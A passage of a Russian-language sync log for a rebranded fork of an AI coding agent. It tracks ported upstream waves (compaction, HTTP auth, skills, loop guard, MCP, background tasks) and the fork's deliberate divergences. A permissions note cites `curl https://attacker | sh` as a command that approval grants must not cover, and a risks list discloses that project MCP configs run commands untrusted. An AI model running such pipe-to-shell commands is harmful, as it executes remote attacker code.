# Upstream sync tracker

Отслеживает, до какого коммита `upstream/main` (coddy-agent) мы портировали изменения
в этот форк (foxxyCode). Форк полностью ребрендирован, поэтому `git merge upstream/main`
не применяется — коммиты портируются вручную с заменой токенов `coddy → foxxycode`.

- **upstream:** `https://github.com/coddy-project/coddy-agent` (remote `upstream`)
- **Порядок обновления:** `git fetch upstream --prune`, затем сравнить
  `git log --oneline <last-synced>..upstream/main` и портировать непортированное.

## С чего начался форк

| Поле | Значение |
| --- | --- |
| **Точка расхождения** | `9370936` «Tunes of e2e tests» (2026-06-29) |
| **Версия upstream на ней** | `0.9.26-4-g9370936` — то есть **тег `0.9.26`** (2026-06-20) плюс 4 коммита |
| **Первый собственный коммит** | `b74dc21` «Rebrand fork as foxxy-agent: module path, binary name, update repo» (2026-07-02) |
| **Первый тег форка, содержащий точку расхождения** | `0.2.2` |

Форк **разделяет историю с upstream**, а не импортирован заново: корневой коммит репозитория —
это `d58cdb5` (2026-03-23) самого coddy-agent, поэтому `git merge-base HEAD upstream/main`
осмысленна и даёт ту самую точку расхождения. Проверить её в любой момент:

```bash
git merge-base HEAD upstream/main          # 9370936
git describe --tags $(git merge-base HEAD upstream/main)   # 0.9.26-4-g9370936
```

Всё, что попало в upstream **после** `9370936`, приходит сюда только через волны из этого
файла. Обратное неверно: коммиты форка в upstream не уходят.

Собственная нумерация версий форка (`0.2.x`) **никак не связана** с upstream-овской (`0.9.x`) —
её ведёт `.github/workflows/tag-on-merge.yaml`, поднимая патч у последнего тега в `origin`.
Поэтому в таблицах ниже upstream-тег — это ориентир «докуда синхронизировано», а не версия
продукта.

---

## Волна `bc1afb9 → 6666606` (тег `0.9.43`) — ГОТОВО

Крупная волна (42 не-merge коммита, 158 файлов), портирована тремя бандлами отдельными коммитами
на ветке `sync/upstream-6666606`: `f0a2506` (Волна 1), `60af986`+`305fc5a` (Волна 2),
`3b3e812`+`0e75aa7` (Волна 3). Все гейты зелёные (go: default/http/http,memory/memory/scheduler/
http,scheduler; UI: 680 vitest + build:go). Итоги:

- **Волна 1 — Compaction (coddy по умолчанию + тумблер на OpenCode) + чистые фиксы — ГОТОВО.**
  - Слиты два движка компакции в один `compaction:`-блок с полем `engine: coddy | opencode`
    (default `coddy`). coddy — новый движок (`internal/agent/compact.go`,
    `internal/session/compaction.go`, ручная `/compact`, авто-компакция, HTTP
    `POST /foxxycode/sessions/{id}/compact`, UI `CompactionMessage.tsx`); opencode — прежний
    движок форка (`internal/agent/compaction.go`, флаг `Compacted`). Диспетчеризация по движку
    в `internal/agent/react.go` (построение окна истории + триггер + перехват `/compact`).
    Конфиг: `internal/config/compaction.go` (поля `engine`, `keep_recent_turns` вместо
    `keep_last_turns`), jsondto/ui_schema/docs/example + RU-оверлей + фикстура ui-schema.
  - Windows session-fix (upstream `4f57540`): `pathMutex` на `FileStore`, `renameWithRetry`,
    `rename_windows.go`/`rename_other.go`. Чинит флейк `TestConcurrentPatchSessionMetaActivitySync`.
  - fs line-endings (upstream `f6cf51c` + `9111fa8`): новый `internal/tools/fs/line_endings.go`,
    правки `edit.go`/`patch.go`/`patch_v4a.go` **вручную поверх cp1251-слоя** `decodeText`/`encodeText`;
    BDD `features/edit_line_endings.feature`. `/compact` объявляется в слэш-меню
    (`skills.BuiltinCommands`, ACP + HTTP `/foxxycode/slash-commands`).
  - Мелочь: staticcheck-гарды (`99259a7`), `.gitignore *.bak` (`87d1040`). `69ce66c`
    (light-theme кнопка) уже был в форке.
  - Гейты зелёные: default / `http` / `http,memory` / `memory` / `scheduler`, `build:go`.
- **Волна 2 — Remote control / http-auth / env-selector — ГОТОВО (backend `60af986` + UI).**
  - Config: `internal/config/http.go` (+`auth_token`/`public_docs`/`allow_insecure`/`cors`/`remotes`
    + helpers `CORSAllowOrigin`/`EffectiveAuthTokens`), `ui.enabled` влит в форковый `UIConfig`;
    jsondto (редакция токена + `ParseConfigJSONPreservingSecrets`); docs schema/reference/example
    + RU-оверлей + фикстура.
  - HTTP: `external/httpserver/auth.go` (bearer-gate, realm `foxxycode`, SSE `?access_token=`,
    **IDE-роуты `/foxxycode/ide/*` освобождены** от auth), `cors.go` (`X-FoxxyCode-Session-ID`),
    `Handler()` = `corsMiddleware(authGate(mux))`, `--auth-token`/`FOXXYCODE_HTTP_TOKEN` +
    non-loopback-warning в `StartHTTP`, `ui.enabled`-гейт SPA-root, openapi `bearerAuth`.
    Тесты: 13 auth/CORS + IDE-exemption unit. Docs: `docs/remote-control.md`, `docs/http-api.md`.
  - UI env-selector: `env/remoteEnv.ts` (fetch-shim, per-env storage), `env/activeHealth.ts`,
    `env/remoteErrors.ts`, `env/EnvHealthBanner.tsx`, `chat/EnvironmentChip.tsx` (чип в
    composer-workspace-строке, меню Local/remotes/Add, health-точки). Shim ставится в `main.tsx`
    до рендера; `workspaceRecents.ts` неймспейсится по env; чип виден и без workspace-контекста.
    Проверено в браузере (чип «Local», меню открывается, 0 console-ошибок; 671 UI-тест зелёный).
  - ~~Осталось в Волне 2: BDD remote-API parity (`46445df`/`328bc25`)~~ — сделано в `f2f4682`
    (`features/remote_api.feature` + харнесс).
- **Волна 3 — Skills marketplace + plugin command — БЭКЕНД ГОТОВ (коммит следующий), UI TODO.**
  - Config: `skills.go` (+`sources`, +`auto_discovery` + флаг `-skills-auto-discovery`), jsondto/ui_schema/
    docs/example + RU-оверлей + фикстура. Core: `internal/skills/{manifest,remote}.go` (git/marketplace
    install-движок), `plugin.go` (`RunPluginCommand`, `MarketplaceStatus`), `Skill.Version`,
    loader dotfile-skip, gitws `Clone`/`Pull`. Plugin: `internal/agent/plugin_command.go` +
    `/plugin` в react.go; `BuiltinCommands` теперь и `plugin`. Auto-discovery: `internal/tools/load_skill.go`
    + `export.go` (гейт auto_discovery) + `toolsets.go` allowlist + `tooling/env.go` `LoadSkillBody` +
    `react.go`/`system_prompt.go` `loadSkillBody`. Плюс fix `f0911c9` (сброс empty-turn counter).
    HTTP: `skills_mgmt.go` расширен до 13 роутов (`s.sessionDefaultCWD()`, `invalidateSlashCache`,
    `reloadConfigFromDisk`), `docs/http-api.md`. CLI: `foxxycode skills add|sync|remove` + `plugin`.
    **Не** портирован транзитный `internal/tools/skills.go` (upstream его удаляет); `print_tree` в форке нет.
  - UI in-app marketplace — **ГОТОВО**: `settings/SkillsSection.tsx` (перепись 140→608, browse/install/
    sync/delete/update + версии), `Switch.tsx` (iOS-тумблер, подключён в `SchemaForm.tsx`),
    `installableMatches.ts`, `skills/commandRows.ts`, styles (~270стр). Билд + 680 UI-тестов зелёные.
    ⚠️ **i18n:** upstream-версия SkillsSection полностью на английском (ре-threading через `t()`/`en.ts`/
    `ru.ts` — отложенный follow-up; старые `settings.skills.*` ключи не используются).
- **Пост-волновые доработки (коммиты `f2f4682` + фикс визуального прогона) — ГОТОВО:**
  - `print_tree` — порт `internal/tools/fs/print_tree.go`, регистрация в fs-билтинах и
    plan-allowlist, тест, `docs/architecture.md`.
  - **Settings → Навыки переведён**: 36 новых `settings.skills.*` ключей в `en.ts`/`ru.ts`
    (46 используемых, полный паритет en/ru). Описание auto-discovery идёт через `tSchemaText`
    (schema-оверлей), иначе оставалось английским — поймано визуальным прогоном,
    регресс-тест `i18n/schemaSkillsLookup.test.ts`.
  - **Exhaustive OpenAPI**: все 12 зарегистрированных `/foxxycode/skills*` роутов описаны
    (10 путей) + схемы `SkillRow` (version/source/readonly), `SkillSyncResult`, `SkillUpdateList`.
  - **BDD**: `features/{plugin_command,remote_api,skills_marketplace}.feature` + харнессы
    (16 сценариев / 101 шаг), `workspace_switching.feature` перенесён в корневой `features/`
    (доделан `328bc25`); правило «happy path → features/, edge cases → unit-тесты» в `AGENTS.md`
    + `.claude/rules` с зеркалом в `.cursor/rules`.
  - **Визуальный прогон** на реальном бэкенде (`-tags http,ui`, изолированный home/config):
    13 вкладок настроек по-русски; Навыки полностью локализованы; «Движок сжатия» = `coddy`;
    slash-каталог отдаёт `compact` + `plugin`; compact-эндпоинт (404/валидация); env-чип
    (Local + Add remote + reachability); OpenAPI отдаёт 10 skill-путей и 5 схем; CLI
    `plugin marketplace list` / `skills list`.
  - **Остаток закрыт** (PR #7, коммит `ea7095d`, ветка `i18n/spa-remaining-english`): полный проход
    локализации SPA. 46 новых ключей (`composer.env.*`, `composer.workspace.*`,
    `composer.folderModal.*`, `env.banner.*`, `env.error.*`, `messages.compaction*`,
    `files.type.*`, `settings.providerApiKeyHint*`) в `en.ts`/`ru.ts`; переведены
    `EnvironmentChip`, `WorkspaceChips`, `WorkspaceFolderModal`, `EnvHealthBanner`,
    `remoteErrors`, `CompactionMessage`, `DiffView`, `UserMessage`, `fileTypeIcon`,
    заголовок «New chat» в `App.tsx` и fallback-ошибки настроек. Не переводятся намеренно:
    `AppErrorBoundary` (должен рендериться, даже если сломалась локализация),
    `compactionSummary.ts` (префиксы матчатся с текстом бэкенда) и технические
    placeholder-ы формата (`provider/model-id`, примеры URL). Защита от повторения хвоста —
    `i18n/messagesParity.test.ts` (паритет ключей и `{param}`-слотов en/ru) и
    `i18n/noHardcodedStrings.test.ts` (скан JSX-текста и label-атрибутов с аллоулистом).

---

## Волна `6666606 → 19754e8` (тег `0.9.43`) — ГОТОВО

9 не-merge коммитов (2026-07-22…23), портированы двумя коммитами на ветке
`claude/sync-foxxy-coddy-agents-c89f5c`.

### Коммит 1 — `usage_update` после компакции (upstream `29c58ae`)

- **ACP/HTTP**: новый `acp.UsageUpdate` (`sessionUpdate: "usage_update"`, `used`/`size`) —
  текущая занятость окна контекста; в `bridge.go` мапится в именованный SSE-эвент
  `usage_update`, описан в `openapi.go` и `docs/http-api.md`.
- **`internal/agent/context_usage.go`** (новый): `setContextBreakdown` пишет оценку в
  `stats.json` через `session.WriteSessionContextBreakdown` (провайдерские счётчики токенов
  сохраняются) и публикует эвент; `refreshConversationContextUsage` пересчитывает
  транскриптовые категории после компакции и после каждого persist-а сообщения.
- **`internal/session/manager_usage.go`** (новый): `restoreContextBreakdown` при загрузке
  сессии + `sendContextUsageUpdate` сразу после регистрации — переоткрытая сессия отдаёт
  сжатое окно, а не значение до компакции.
- **Turn-lock**: `acquireStubTurnLock` теперь `TryLock` и возвращает `ErrSessionTurnBusy`
  (как unix-flock), т.е. второй параллельный turn падает быстро, а не встаёт в очередь.
  Это путь `!unix`, т.е. **Windows** — прогнаны `internal/session` и `external/httpserver`.
- **SPA**: `withContextUsedTokens` в `contextUsage.ts`, ветка `usage_update` в
  `consumeComposerSse.ts`, `branchContextUsage` в обоих вызовах `consumeComposerSseReader`
  в `App.tsx`.

**Расхождения с upstream (осознанные, из-за двух движков компакции):**
- `llmVisibleMessages()` повторяет диспетчеризацию `buildMessages` (`MessagesForLLM` для
  `coddy`, фильтр `isLLMHistoryMessage` для `opencode`) и теперь кормит
  `computeContextBreakdown`. Это **починка живого бага форка**: `buildSystemPrompt` передавал
  нефильтрованный транскрипт, поэтому на дефолтном движке `coddy` (у него свёрнутые сообщения
  без флага) кольцо контекста не уменьшалось после компакции.
- Движок `opencode` теперь тоже публикует usage (после `ReplaceMessagesAndPersist`) — до этого
  он не отдавал `usage_update` вообще.
- Пересчитываются **и** `Conversation`, **и** `Summary`: компакция переносит текст из первой
  категории во вторую.
- `internal/skills/remote_test.go` (Windows-фикс `filepath.Abs`) не портирован — в форке уже
  есть эквивалентное исправление через `t.TempDir()`.

**Тесты:** upstream-овские BDD-шаги (ACP/HTTP/stats) + юнит-тесты, плюс два фичефайла форка,
которых в upstream нет: `features/context_compaction_engines.feature` (ACP-usage совпадает с
LLM-окном на **обоих** движках) и `features/context_compaction_restore.feature` (usage
выживает перезапуск сервера на обоих движках; `/compact` рекламируется только на `coddy`).
Оба проверены «наоборот»: без форковых правок сценарии падают.

### Коммит 2 — Tool-approval previews (upstream `2d5f2e7` + 6 follow-up)

Портировано как итоговое состояние (`git diff 6666606 upstream/main`), т.к. follow-up-ы только
дошлифовывают первый коммит, а три из них — только скриншоты.

- Новые `chat/permissionToolPreview.ts` и `chat/PermissionPromptPreview.tsx`: общий
  tool-specific preview для permission-гейта и раскрытой карточки инструмента.
- `PermissionPromptSection` — вопрос + один tool-id бейдж + preview; `ToolCallMessage` —
  статический preview + отдельная карточка `Результат`; единая кнопка
  `tool-overflow-toggle` (`Ещё…`/`Свернуть`) вместо текстовых ссылок в `ToolCallMessage`
  и `DiffView`; `rm`/`rmdir` добавлены в write-списки.

**Расхождения с upstream (осознанные):**
- **i18n:** весь новый слой переведён сразу (~30 ключей `prompts.permissionQuestion.*`,
  `prompts.permissionHeader.*`, `prompts.permissionMeta.*`, `messages.toolMore/toolLess/
  toolResultSection/patchPreviewAriaLabel/editPreviewAriaLabel`) в `en.ts` **и** `ru.ts`.
  Upstream-версия целиком английская.
- Upstream удаляет `permissionPromptTitle`; в форке он кормил desktop-тост, поэтому тост
  перевешен на `buildPermissionToolPreview(p).title` (тост и карточка теперь дают один текст),
  а ключи `prompts.permission{Fallback,ToolFallback,RunCommand}` удалены.
- `PermissionPromptSection` сохраняет форковый `submitPermissionChoice` (не inline `fetch`).
- `ToolCallMessage` сохраняет `useT()`, проп `sessionId` и ветку `BrowserAction`; новый preview
  выключен для browser-инструментов (`!isBrowserTool`), чтобы карточка скриншота осталась
  единственным рендерером.
- **CSS:** upstream-правило `[data-theme="light"] .chat-bottom:has(.composer-wrap-docked)` не
  проходит Chromium-104 гейт — переписано на форковый маркер `.chat-bottom--docked`
  (`themeCssContract.test.ts` матчится на него). У `.shell` `100svh` заменён на `100dvh`,
  потому что `check:compat` требует не-viewport fallback **непосредственно** перед `dvh`.
- `DiffView.tsx` и `chat/toolCallArgsDisplay.ts` остаются в дереве (как в upstream), хотя
  `ToolCallMessage` их больше не использует.

**Живая проверка** (реальный провайдер `neuraldeep`, ключ только через `NEURALDEEP_API_KEY`,
изолированные home/config вне репозитория):
- счётчик растёт на реальных turn-ах и совпадает с `usage_update` и `/stats` до токена;
- `/compact` на большой сессии: 6824 → 5052, значение из стрима == `/stats`, без перезагрузки;
- перезапуск бинаря: 5052 восстановлено из `stats.json` (и 4803 на `opencode`);
- авто-компакция срезает окно **внутри** одного стрима (5757 → 4918 на `coddy`,
  5757 → 4840 на `opencode` вместе с эвентами `compaction` start/done);
- кольцо в SPA живьём: 53.4 → 42.5 → 42.6 без перезагрузки;
- permission-карточки `write` / `run_command` / `edit` и раскрытая карточка инструмента —
  по-русски, `Ещё…`/`Свернуть` работает на усечённом результате (20 → 41 строка, viewport
  переключается на `--scroll`), консоль чистая.

**Отложено:** четыре PNG `docs/assets/screenshot-tool-previews*.png`. Решено снимать своим UI
(не тащить coddy-брендированные кадры upstream), но снять их в этой сессии не удалось — панель
браузера не отображалась (`screenshot` требует компоновки кадров), подключённого Chrome нет.
Записи в `docs/assets/INDEX.md` намеренно **не** добавлены, чтобы не ссылаться на отсутствующие
файлы. Когда панель будет открыта: снять `screenshot-tool-previews-{light,dark}.png` и
`screenshot-tool-previews-overflow-{light,dark}.png` и добавить секцию в `INDEX.md`.

---

## Волна `19754e8 → 96c04fb` (тег `0.9.44`) — ГОТОВО

5 не-merge коммитов (2026-07-25…26), 38 файлов. Портированы четырьмя коммитами.
Разведка перед портом показала, что база почти не разошлась: `internal/rules/{agents,select,list}.go`
**побайтово совпадали** с upstream на `19754e8`, сигнатуры `buildSystemPrompt`/`buildMessages`
идентичны, места патча в `.github/workflows/*` совпадали построчно.

### Коммит 1 — Loop guard (upstream `875bade`, наш `3c12ebd`)

Защита от зацикливания ReAct-турна. `internal/agent/loopguard.go` (портирован 1:1):
`streamRepeatDetector` следит за одним потоковым каналом (текст ответа или reasoning) по
скользящему нормализованному окну и срабатывает, когда хвост — это один и тот же фрагмент,
повторённый подряд; `toolRepeatDetector` считает подряд идущие одинаковые вызовы инструмента
по ключу «имя + канонизированные аргументы». При срабатывании повтор **вырезается** из
сохранённого сообщения ассистента (иначе `buildMessages` вернёт его модели и пересеет цикл).
Политика — nudge-then-stop: до `agent.loop_nudge_max` подсказок, затем `StopReasonRefused`.
Конфиг (секция `agent`, всё с дефолтами): `loop_guard`, `loop_tool_repeat_limit`,
`loop_stream_repeat_cycles`, `loop_nudge_max` — плюс полная обвязка jsondto/ui_schema/
schema_ui_defaults/`docs/config.schema.json`/`config-reference`/`config.md`/`config.example.yaml`/
`react-agent.md`/`architecture.md`/`README.md`.

**Расхождения с upstream (осознанные):**
- **Стрим-колбэк.** В форке текстовая ветка раздвоена (`else if chunk.TextDelta != ""` —
  whitespace-дельты не закрывают reasoning-часы). Проверка детектора вставлена **перед** обеими
  ветками, а срабатывающая дельта переиспускается с форковым правилом `markReasonEnd`
  (`strings.TrimSpace(delta) != ""`), а не безусловным `true`, как в upstream.
- **jsondto / schema_ui_defaults.** В форке нет upstream-хелперов `cloneBoolPtr`/`cloneIntPtr`/
  `boolPtr`/`intPtr`; следуем форковой конвенции — прямое копирование указателей (как
  `Compaction.KeepRecentTurns`) и локальные переменные + `&x`.
- **`NewAgent` вернул upstream-гард `if log == nil { log = slog.Default() }`.** Форк его потерял,
  из-за чего новые `a.log.Warn` паниковали на nil-логгере в тестах. Это чинит и **предсуществующие**
  nil-падения форка: `compact.go:218`, `context_usage.go:47`, `memory_hooks.go:78` дерефают
  `a.log` без проверки.
- **i18n:** текст остановки локализован в SPA — `chat/loopGuardNotice.ts` (матчинг по тексту
  бэкенда, тот же приём, что в `chat/compactionSummary.ts`) + ключи `messages.loopGuard*` в
  `en.ts`/`ru.ts`, подключено в `messages/SystemNoticeMessage.tsx` (локализованный текст идёт и в
  кнопку «копировать»). Бэкенд-строки остаются английскими: они же попадают в поле `error`
  HTTP/ACP-ответа. Строки config-схемы переведены в `schema.ru.ts`, фикстура `ui-schema.json`
  перегенерирована.

**Тесты:** `features/loop_protection.feature` (3 сценария — вырождение текста, вырождение
reasoning, повтор тулкола — против настоящего `Agent.Run` с фейковым провайдером),
`loopguard_test.go`, три кейса в `react_test.go` (исчерпание бюджета подсказок, выключенный
гард, различающиеся аргументы тулкола), `loopGuardNotice.test.ts`.

### Коммит 2 — Directory-scoped nested `AGENTS.md` (upstream `692a246`, наш `5d103cf`)

`AgentsProvider` делал из каждого вложенного `AGENTS.md` always-applied auto-правило без глобов,
поэтому `MatchAuto` пускал их все на первом же ходу. Теперь у каждого — свой `Rule.ScopeDir`
(новый `internal/rules/scope.go`: `PathUnderDir`/`PathsUnderDir`/`MatchScoped`), и тело попадает
в промпт только когда fs-тулкол или `file://`-путь целится в этот каталог или ниже; дальше
залипает на сессию. `run_command` не активирует ничего. Плюс кап 256 КБ на тело (как
`LoadProjectDocs`), колонка `GLOBS` → `ACTIVATES ON` в `foxxycode rules list`, фикс
`file:///C:/…` в `extractContextFiles` (Windows-путь `/C:/…` не матчился ни с одним scope и глобом).

**Форк-специфика:** хук `activateScopedRulesForToolCall` стоит в начале `executeToolCall` —
эта точка покрывает **и** ReAct-цикл, **и** форковый resume-after-permission
(`resume_permission.go:52` идёт через тот же `executeToolCall`). Активированное множество
пишется в `SetActiveAutoRules`, откуда его подхватывает форковый `buildRulesPromptMarkdown`
(`internal/agent/rules_prompt.go`) — правок в самом `rules_prompt.go` не потребовалось.
`docs/rules.md` не заменён блоком upstream (файл разошёлся: `.foxxyrules`, свои источники) —
внесены только смысловые правки.

**Тесты:** `features/agents_md_scoping.feature` (**проверен «наоборот»**: с `ScopeDir: ""`
сценарий падает на шаге «первый запрос несёт корневой AGENTS.md, но ни одного вложенного»),
`internal/rules/scope_test.go`, `internal/tools/fs/toolpaths_test.go`,
`internal/agent/rules_activation_test.go`, кап-кейс в `rules_test.go`.

### Коммит 3 — pre-commit-гейт (upstream `1570a19` + `b9dd5cb`, наш `9f9b476`)

`.githooks/pre-commit` → `scripts/checks.sh`; `make hooks` включает его один раз на клон.
По умолчанию только `make lint`; docs-only коммиты гейт пропускают.

**Форк-специфика:** переменные `CODDY_HOOK_*` → **`FOXXYCODE_HOOK_*`** (`LINT`/`TESTS`/`SKIP`).
Добавлен **`.gitattributes`** с `*.sh text eol=lf` и `.githooks/* text eol=lf`: форк разрабатывается
на Windows с `core.autocrlf=true`, который иначе переписал бы оба скрипта в CRLF при checkout и
сломал строку shebang. Exec-биты выставлены явно (`git update-index --chmod=+x`) — Windows не
сообщает filemode. В `AGENTS.md` отмечено, что `FOXXYCODE_HOOK_TESTS=full` идёт через `make test`,
чей шаг `ui-build` на этой машине падает, поэтому практический opt-in — `fast`.

**Проверено:** хук прогнан на обоих состояниях индекса (docs-only пропускает гейт; staged
Makefile/скрипт запускает `make lint` — 0 issues); ручки `checks.sh` проверены напрямую
(skip, lint off, неизвестное `TESTS` → выход 2).

### Коммит 4 — фикс GitHub Actions (upstream `0191068`) + этот файл

`allow-unsafe-pr-checkout: true` в `actions/checkout` трёх workflow (`docker-build-push`,
`release-binaries`, `tag-on-merge`) — под `pull_request_target` checkout иначе отказывается брать
tag, производный от форка. Патч применился как есть; гейты безопасности, на которые ссылаются
комментарии (шаг «Ensure tag is on main», условие `merged == true`), в форке присутствуют.

---

## Волна `96c04fb → 6d46afe` (теги `0.9.45`–`0.9.48`) — ГОТОВО

Волна разбита на четыре независимых upstream-блока и адаптирована к текущей архитектуре
FoxxyCode.

### Windows shell и PowerShell (`96c04fb → 5c59782`)

- Добавлен platform-aware вывод команд и корректная сборка PowerShell-скриптов:
  многострочные команды, специальные символы, native stderr/stdout и exit code больше не
  зависят от синтаксиса POSIX shell.
- Маркер успешного выполнения переименован в `$__foxxycodeOK`.
- `api_key_command` использует ту же платформенную shell-обвязку.
- Сохранены форковые особенности: CP1251 read/grep и Ask-mode shell validator.

### Управление MCP (`5c59782 → f664884`)

- Портированы конфиг/JSON DTO, lifecycle подключений, удалённые MCP-серверы, HTTP management API,
  OpenAPI, BDD/unit-тесты и отдельная вкладка MCP в настройках SPA.
- Управляемые клиенты пересоздаются при смене project CWD; ACP-клиенты при этом сохраняются.
  Probe-cache также разделён по рабочему каталогу.
- Сохранены форковые фильтры инструментов по режиму (`agent`/`plan`/`docs`/`ask`) и динамическая
  фильтрация конфигурации.
- Весь новый UI локализован через `t()`; EN/RU parity и запрет hardcoded-строк проверены тестами.

### Codex OAuth/provider (`f664884 → 171854c`)

- Добавлены `foxxycode codex login/logout/status`, device OAuth, provider `codex`, загрузка моделей,
  reasoning replay и HTTP/UI-поток авторизации.
- Codex добавлен в first-run onboarding: вместо API-ключа показывается ChatGPT OAuth, а каталог
  моделей читается по server-side credential до сохранения нового провайдера.
- Внутренние имена ребрендированы (`FOXXYCODE_CODEX_BASE_URL`, managed source `foxxycode`), но
  внешний контракт Codex CLI намеренно сохранён: `CODEX_HOME`, `~/.codex/auth.json`,
  source `codex_cli`.
- Сохранены FoxxyCode `MaxContextTokens`, NeuralDeep-настройки и обе реализации compaction.
- Автогенерация заголовка в продукте не отключалась; только изолирована в сценарных тестах с
  жёстко запрограммированным провайдером, чтобы фоновый title-request не сдвигал их очередь.

### Result eviction и output limits (`171854c → 6d46afe`)

- Добавлена проекция истории перед отправкой LLM: устаревшие крупные результаты инструментов
  удаляются, а `keep_result` закрепляет нужное наблюдение.
- Добавлены настраиваемые лимиты строк/байтов для встроенных и MCP-инструментов с UTF-8-safe
  усечением; схемы, примеры конфигурации и UI schema синхронизированы.
- `keep_result` доступен во всех форковых read-capable режимах, включая `docs` и `ask`.
- Сохранены обе реализации compaction: coddy-проекция учитывает записи и pins из оставляемого
  хвоста до выбора старой головы.
- Мутации SVN инвалидируют закреплённые чтения по named paths, а без них — всю рабочую
  область; `svn_add` и `svn_commit` не инвалидируют ничего, так как содержимое рабочей копии
  не переписывают. Добавлены регрессионные тесты. Слой CP1251 в read/grep сохранён.

### Известные риски этой волны

Приняты осознанно, чинить отдельными PR:

- **Project-local `.foxxycode/mcp.json` исполняется без гейта доверия.** Запись `command` из
  `<cwd>/.foxxycode/mcp.json` запускается при старте сессии, при смене рабочей папки и при
  пробе `GET /foxxycode/mcp`. Открытие чужого репозитория (в том числе через форковый
  project-folder-picker) означает выполнение произвольной команды. Нужен TOFU-гейт:
  список доверенных папок в `<home>` плюс подтверждение в SPA.
- **Из настроек пропал редактор `mcp_servers` из `config.yaml`.** Ключ убран из
  `ARRAY_LABEL_FIELDS`, а новая секция MCP помечает записи с `origin=config` как readonly.
  Enable/disable для них работает, правка и удаление — только руками в `config.yaml`.
- **Result eviction и `tools.output_limits` включены по умолчанию.** Для существующих сессий
  это меняет поведение сразу: `run_command` режется на 500 строках (и жёстком потолке 64 KiB),
  непомеченные read/grep схлопываются в плейсхолдеры. Проговорить в релиз-нотах.
- **`streamableHTTPTransport` не закрывает канал сообщений.** У `sseTransport` закрытие канала
  роняет ожидающие вызовы сразу, у streamable HTTP такого пути нет: если сервер принял POST,
  открыл SSE-поток и замолчал, вызов висит до истечения ctx. Аккуратное исправление требует
  учёта in-flight читателей, иначе получится паника на закрытом канале или потеря сообщений.
- **Проекция eviction меняет префикс сообщений по мере скольжения окна `keep_recent`,**
  то есть инвалидирует prompt cache провайдера почти каждый ход. Стоит померить, не дороже ли
  это экономии на токенах.

### Проверка форковых регрессий

Перед портом просмотрены последние изменения FoxxyCode из PR #18–#20. Сохранены:

- `session_busy`, turn-lock, отмена и восстановление долгого стриминга;
- `X-Accel-Buffering: no`, быстрый список сессий и порядок загрузки transcript/list/stats;
- форковая status line и остальные секции настроек SPA.

Покрытие этой волны включает feature-сценарии для PowerShell, MCP, Codex OAuth и result eviction,
unit-тесты конфигурации/компакции/лимитов, HTTP-регрессии и UI i18n/schema-тесты.

---

## Волна `6d46afe -> 5e44bdb` (тег `0.9.49`) — ГОТОВО

5 не-merge коммитов (2026-07-30…31), одна связная фича **background tasks**: ~9200 строк,
86 файлов. Портирована четырьмя коммитами на ветке `claude/coddy-agent-port-test-14016f`.

Что даёт: `run_command` получает `background: true` (+ `notify_on_finish`, `expected_seconds`)
и уходит в пул задач вместо блокирующего ожидания; пять инструментов
`background_list / background_output / background_wait / background_stop / background_reap`;
задача с `notify_on_finish` по завершении сама будит агента новым ходом; панель фоновых задач
в SPA под последним сообщением со своим hash-роутом; ортогональная правка прав —
опция `allow_always_program`.

### Коммит 1 — движок: `platform/procgroup` + `internal/bgtask` + конфиг (`f836c26`)

`internal/bgtask` (6 файлов + 1012-строчный тест) взят у upstream без изменений, кроме ребренда.
Конфиг: секция `tools.background` (`enabled`/`max_concurrent`/`default_timeout_seconds`/
`max_timeout_seconds`/`output_buffer_bytes`) + jsondto/ui_schema/docs/example, перегенерированная
фикстура `ui-schema.json` и RU-оверлей `schema.ru.ts`.

**Расхождение с upstream — `ProcessGroupAlive` на Windows (осознанное).**
> ⚠️ **СНЯТО в волне `0f2dbf1 → fa7ecf1`.** Upstream пришёл к тому же диагнозу и пошёл дальше:
> добавил идентичность процесса (`process_started_at`) и сделал пробу fail-closed, потому что
> тот же булев ответ теперь авторизует `taskkill /T /F`. Форковый файл заменён на upstream'ский
> целиком; ниже — история, а не действующее поведение. Подробности в разделе той волны.

Upstream пробует pid через `os.FindProcess`, что отвечает на вопрос «могу ли я открыть этот pid»,
а не «жив ли он», и врёт в обе стороны. Проверено эмпирически на этой машине:

- `os.FindProcess` открывает с `PROCESS_QUERY_INFORMATION`, который запрещён между контекстами
  безопасности, поэтому выживший процесс, запущенный с повышением или от другого пользователя,
  читается как мёртвый и никогда не будет прибран. На pid 4 (`System`): upstream `false`,
  у нас `true`.
- Объект процесса живёт, пока открыт хоть один хэндл, а `bgtask` держит такой хэндл на каждую
  запущенную задачу, поэтому завершившийся потомок читается как живой. Проверено:
  upstream `true`, у нас `false`.

У нас: `OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)` (выдаётся между уровнями целостности) +
`GetExitCodeProcess`, живым считается только `STILL_ACTIVE`; access-denied означает «процесс есть,
но защищён», то есть жив. Покрыто `internal/platform/procgroup_windows_test.go`.

Конфиг следует форковым конвенциям, а не upstream: прямое копирование указателей в `jsondto`
(в форке нет `cloneBoolPtr`/`cloneIntPtr`) и без `omitempty` на struct-поле.

### Коммит 2 — инструменты, права, агент (`98c809a`)

`run_command` плюс пять `background_*` тулов за `tools.background.enabled`, `BackgroundWaker`,
`permission.Options` вместо трёх захардкоженных опций, `program.go` с `allow_always_program`.
Гранты сессии больше не делят префиксный матч с конфиговым allowlist: грант расширяется только
на кандидата, который сам является «простым вызовом», поэтому одобрение `curl https://trusted`
не авторизует `curl https://attacker | sh`.

**Расхождение — режимы.** У upstream два режима, у форка четыре:

- `plan` — четыре наблюдающих тула (как в upstream), без `background_reap`;
- `ask` (extended) — они же: ask уже даёт `run_command`, значит фоновая задача достижима
  и должна оставаться наблюдаемой;
- `ask` basic-only и `docs` — ничего: там нечем запустить команду;
- `background_reap` остаётся только в agent-режиме: он убивает группы процессов,
  которые эта сессия не запускала.

Закреплено `internal/agent/background_toolset_test.go`, включая путь отказа во время исполнения
(`toolCallRefusedByMode`) — в upstream этого покрытия нет.

Плюс восемь попутных gofmt-фиксов из того же диапазона (`ssh/exec.go`, `todo/*.go`), которые
в форке разошлись идентично.

### Коммит 3 — HTTP-слой (`9a8f668`)

Роуты `/foxxycode/sessions/{id}/background-tasks` (list / clear / get-with-output / stop),
`StopSession` при удалении сессии, закрытие пула в `Drain` и открытие в `New`,
`attachBackgroundWaker`.

**Расхождение — ретрай на `session_busy` (осознанное).** У upstream turn-lock ставит в очередь,
поэтому wake, прилетевший в середине хода, просто ждёт. У форка он падает быстро с
`ErrSessionTurnBusy` — то же поведение, благодаря которому композер отвечает 409 `session_busy`,
а не висит, — и `BackgroundWaker` выбрасывает батч, чей `run` вернул ошибку. При портировании
